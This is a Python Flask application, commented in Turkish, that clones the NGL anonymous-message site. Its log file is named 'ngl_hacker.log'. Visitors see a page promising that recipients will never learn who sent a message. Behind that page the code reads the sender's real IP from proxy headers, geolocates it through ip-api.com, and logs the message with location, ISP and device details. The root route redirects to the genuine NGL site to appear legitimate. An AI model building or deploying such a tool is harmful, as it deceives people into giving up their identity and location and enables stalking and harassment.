from flask import Flask, request, render_template_string, redirect
import logging
import requests
from werkzeug.middleware.proxy_fix import ProxyFix

# Logging ayarları (hem konsol hem dosya)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
        logging.StreamHandler()  # Konsola da bassın (Render, Railway vs. için önemli)
    ]
)

app = Flask(__name__)

# Proxy arkasında gerçek IP'yi almak için (Render, Railway, Heroku vs.)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

# Gerçek NGL klonu HTML + CSS (çok güzel olmuş bu arada 🔥)
NGL_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGL</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4rem;
            font-weight: 800;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        p { font-size: 1.3rem; opacity: 0.8; margin-bottom: 40px; }
        textarea {
            width: 80%;
            max-width: 500px;
            height: 120px;
            background: rgba(255,255,255,0.1);
            border: none;
            border-radius: 16px;
            padding: 20px;
            color: white;
            font-size: 1.2rem;
            resize: none;
            outline: none;
            backdrop-filter: blur(10px);
        }
        textarea::placeholder { color: rgba(255,255,255,0.6); }
        button {
            margin-top: 30px;
            padding: 16px 40px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .success {
            font-size: 2rem;
            margin-top: 50px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    {% if success %}
        <div class="success">✅ Mesajın gönderildi!</div>
        <p>Kim olduğunu asla öğrenemeyecekler 😉</p>
    {% else %}
        <h1>@{{ username }}</h1>
        <p>Anonim mesaj gönder</p>
        <form method="POST">
            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
            <button type="submit">Gönder</button>
        </form>
    {% endif %}
</body>
</html>
"""

@app.route('/<username>', methods=['GET', 'POST'])
def ngl_page(username):
    # Gerçek IP'yi al (Cloudflare, Render, Railway vs. için en sağlam yöntem)
    if request.headers.get('CF-Connecting-IP'):
        client_ip = request.headers.get('CF-Connecting-IP')
    elif request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        client_ip = request.headers.get('X-Real-IP')
    else:
        client_ip = request.remote_addr or '127.0.0.1'

    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]

    # IP'den konum bilgisi al
    try:
        response = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=6)
        geo = response.json()
        if geo.get('status') == 'success':
            location = f"{geo.get('city', 'Bilinmiyor')}, {geo.get('regionName', '')} {geo.get('country', '')}".strip()
            isp = geo.get('isp', 'Bilinmiyor')
            org = geo.get('org', '')
        else:
            location = "Konum alınamadı"
            isp = "Bilinmiyor"
            org = ""
    except Exception:
        location = "Konum alınamadı (bağlantı hatası)"
        isp = "Bilinmiyor"
        org = ""

    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        if msg:
            log_entry = f"@ {username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | CİHAZ: {user_agent}"
            logging.info(log_entry)
            print(f"[NEW MESSAGE] {log_entry}")  # Konsolda da görünsün

        return render_template_string(NGL_HTML, username=username, success=True)

    # Sadece sayfa görüntülendiğinde (isteğe bağlı log)
    # logging.info(f"Sayfa açıldı → @{username} | IP: {client_ip} | {location}")
    
    return render_template_string(NGL_HTML, username=username, success=False)


@app.route('/')
def home():
    return redirect("https://ngl.link")


if __name__ == '__main__':
    # Render, Railway, Vercel vs. için port ortam değişkeni
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)  # Production'da debug=False olsun
